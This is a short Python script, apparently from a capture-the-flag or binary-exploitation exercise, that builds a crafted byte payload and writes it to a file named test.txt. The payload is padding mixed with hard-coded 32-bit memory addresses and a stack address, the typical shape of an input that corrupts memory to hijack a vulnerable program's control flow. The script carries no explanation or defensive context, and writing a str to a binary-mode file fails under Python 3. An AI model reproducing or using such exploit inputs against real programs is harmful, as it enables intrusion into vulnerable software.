def main():
    payload = "A"*32+"\x34\x00\x00\x00"+"A"*10+"\x48\x00"+"\x01\x00"+"\x00\x00"+"\x00"*20+"\x10\x00\x00\x00"+"\x00"*16+"\x38\xa0\x04\x08"+"AAAA"+"\x08\xa0\x04\x08"+"\x02\x00\x00\x00"+"A"*8+"ebp-"+"\x1b\xdf\xff\xff"
    fp = open("test.txt","wb")
    fp.write(payload)
    fp.close()
    pass
main()
